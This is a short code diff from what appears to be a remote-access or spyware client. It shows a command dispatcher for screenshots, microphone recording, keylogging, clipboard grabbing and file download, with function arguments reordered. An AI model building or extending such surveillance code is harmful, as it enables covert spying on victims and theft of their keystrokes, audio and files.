@@ -57,13 +57,13 @@ def command(data):
     if command == 'screenshot':
         take_and_send_screenshot(sio, user_id)
     elif command == 'microphone':
-        record_and_send_audio(duration, sio, user_id)
+        record_and_send_audio(sio, duration, user_id)
     elif command == 'keylogger':
-        record_and_send_keyboard_log(duration, sio, user_id)
+        record_and_send_keyboard_log(sio, duration, user_id)
     elif command == 'clipboard':
         get_clipboard_content(sio, user_id)
     elif command == 'downloadfile':
-        download_file(file_path, sio, user_id)
+        download_file(sio, file_path, user_id)
 
 
 @sio.event
